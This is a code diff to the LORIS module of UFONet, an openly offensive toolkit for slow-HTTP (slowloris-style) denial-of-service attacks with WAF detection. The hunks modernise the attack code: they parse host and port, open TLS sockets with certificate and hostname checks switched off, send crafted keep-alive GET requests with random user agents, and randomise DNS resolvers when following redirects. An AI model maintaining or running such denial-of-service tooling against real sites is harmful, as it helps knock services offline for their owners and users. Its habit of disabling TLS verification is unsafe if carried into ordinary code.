@@ -3,17 +3,14 @@
 """
 This file is part of the UFONet project, https://ufonet.03c8.net
 
-Copyright (c) 2013/2020 | psy <epsylon@riseup.net>
+Copyright (c) 2013/2026 | psy <epsylon@riseup.net>
 
 You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 import socket, random, ssl, re
-try:
-    from urlparse import urlparse
-except:
-    from urllib.parse import urlparse
+from urllib.parse import urlparse
 
 # UFONet Slow HTTP requests (LORIS) + [AI] WAF Detection
 def setupSocket(self, ip):
@@ -25,11 +22,19 @@ def setupSocket(self, ip):
     elif ip.startswith('https://'):
        ip = ip.replace('https://','')
        port = 443
+    if ':' in ip and not ip.count(':') > 1:
+        host_part, port_part = ip.rsplit(':', 1)
+        if port_part.isdigit():
+            ip = host_part
+            port = int(port_part)
     self.user_agent = random.choice(self.agents).strip()
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.settimeout(10)
     if port == 443:
-        sock = ssl.wrap_socket(sock, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_TLSv1)
+        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        sock = ctx.wrap_socket(sock, server_hostname=ip)
     sock.connect((ip, port))
     if method == "GET":
         http_req = "GET / HTTP/1.1\r\nHost: "+str(ip)+"\r\nUser-Agent: "+str(self.user_agent)+"\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\n\r\n"
@@ -42,16 +47,16 @@ def setupSocket(self, ip):
     for l in resp:
         if "Location:".encode('utf-8') in l:
             try:
-                ip = re.findall('https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', l)[0] # extract new redirect url
+                ip = re.findall(r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', l)[0] # extract new redirect url
                 try:
                     ip = socket.gethostbyname(ip)
                 except:
                    try:
                        import dns.resolver
                        r = dns.resolver.Resolver()
-                       r.nameservers = ['8.8.8.8', '8.8.4.4'] # google DNS resolvers
+                       from core._dns_pool import random_resolvers; r.nameservers = random_resolvers(2)
                        url = urlparse(ip)
-                       a = r.query(url.netloc, "A") # A record
+                       a = r.resolve(url.netloc, "A") # A record
                        for rd in a:
                            ip = str(rd)
                    except:
@@ -127,9 +132,9 @@ class LORIS(object):
             try:
                 import dns.resolver
                 r = dns.resolver.Resolver()
-                r.nameservers = ['8.8.8.8', '8.8.4.4'] # google DNS resolvers
+                from core._dns_pool import random_resolvers; r.nameservers = random_resolvers(2)
                 url = urlparse(target)
-                a = r.query(url.netloc, "A") # A record
+                a = r.resolve(url.netloc, "A") # A record
                 for rd in a:
                     ip = str(rd)
             except:
